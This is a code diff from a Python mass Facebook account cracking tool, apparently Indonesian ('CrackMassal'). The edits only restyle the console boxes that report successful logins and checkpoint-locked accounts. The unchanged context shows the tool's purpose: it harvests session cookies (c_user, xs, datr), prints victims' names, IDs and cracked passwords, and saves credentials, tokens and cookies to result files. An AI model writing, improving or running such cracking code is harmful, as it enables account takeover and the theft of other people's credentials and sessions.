@@ -87,13 +87,13 @@ class CrackMassal:
                     if n in ["c_user", "xs", "fr", "datr", "sb", "wd", "presence"]:
                         clist.append(f"{n}={v}")
                 cookies = "; ".join(clist) + ";"
-        print(f"\n{I} ┌───────────────────── BERHASIL LOGIN ─────────────────────┐")
-        print(f" │{P} NAMA       : {I}{name}")
-        print(f" │{P} ID         : {I}{uid}")
-        print(f" │{P} PASSWORD   : {I}{password}")
-        print(f" │{P} COOKIEE    : {I}{cookies}")
-        print(f" │{P} USER AGENT : {K}{ua}")
-        print(f"{I} └──────────────────────────────────────────────────────────┘{P}")
+        print(f"\n{I} ┌───────── {I}BERHASIL LOGIN{I} ─────────┐")
+        print(f" {P}│ NAMA     : {I}{name}")
+        print(f" {P}│ ID       : {I}{uid}")
+        print(f" {P}│ PASSWORD : {I}{password}")
+        print(f"{I} └──────────────────────────────────┘")
+        print(f" {P}COOKIEE    : {I}{cookies}")
+        print(f" {P}USER AGENT : {K}{ua}")
         self.save_result("Results", "OK.txt", f"{uid}|{password}|{token}|{cookies}")
         self.ok += 1
     def login(self, uid, name, pw):
@@ -112,12 +112,12 @@ class CrackMassal:
                 self.parse_success(resp, uid, name, pw, m.user_agent)
             elif "checkpoint" in resp.lower():
                 self.cracked_uids.add(uid)
-                print(f"\n{K} ┌───────────────────── AKUN CHECKPOINT ─────────────────────┐")
-                print(f" │{P} NAMA       : {name}")
-                print(f" │{P} ID         : {uid}")
-                print(f" │{P} PASSWORD   : {pw}")
-                print(f" │{P} STATUS     : {M}CHECKPOINT (Sesi Terkunci)")
-                print(f"{K} └──────────────────────────────────────────────────────────┘{P}")
+                print(f"\n{K} ┌──────── {K}AKUN CHECKPOINT{K} ────────┐")
+                print(f" {P}│ NAMA     : {name}")
+                print(f" {P}│ ID       : {uid}")
+                print(f" {P}│ PASSWORD : {pw}")
+                print(f" {P}│ STATUS   : {M}CHECKPOINT (Lock)")
+                print(f"{K} └──────────────────────────────────┘{P}")
                 self.save_result("Results", "CP.txt", f"{uid}|{pw}")
                 self.cp += 1
             elif "e53" in resp.lower() or "error_message" in resp.lower():
